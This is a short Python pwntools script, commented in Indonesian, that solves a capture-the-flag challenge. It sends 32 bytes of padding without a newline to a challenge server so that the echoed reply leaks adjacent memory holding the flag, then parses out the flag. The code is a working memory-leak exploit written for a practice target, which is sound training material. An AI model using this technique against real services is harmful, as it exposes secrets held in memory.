from pwn import *

HOST = 'chals.cyberjousting.com'
PORT = 1366

# Hubungkan ke remote server
r = remote(HOST, PORT)

# Tunggu prompt awal
r.recvuntil(b"say to it?\n")

# Jarak dari buf ke flag adalah 32 byte. 
# Kita kirim 32 byte 'A' tanpa newline di ujungnya agar tidak merusak karakter awal flag.
payload = b"A" * 32

r.send(payload)

# Terima respon dari server
r.recvuntil(b"You said: ")
# Server akan mencetak 32 'A' diikuti dengan isi flag yang bocor
raw_output = r.recvall(timeout=2)

print(f"\n[+] Raw Output dari Server:\n{raw_output}")

# Bersihkan output untuk mengambil string flag
decoded_output = raw_output.decode('utf-8', errors='ignore')

# Cari flag di dalam teks yang bocor
if "byuctf{" in decoded_output.lower():
    start_idx = decoded_output.lower().find("byuctf{")
    end_idx = decoded_output.find("}", start_idx) + 1
    flag = decoded_output[start_idx:end_idx]
    print(f"\n<FLAG>{flag}</FLAG>")
else:
    print("\n[-] Flag tidak ditemukan secara utuh. Periksa kembali teks di atas.")
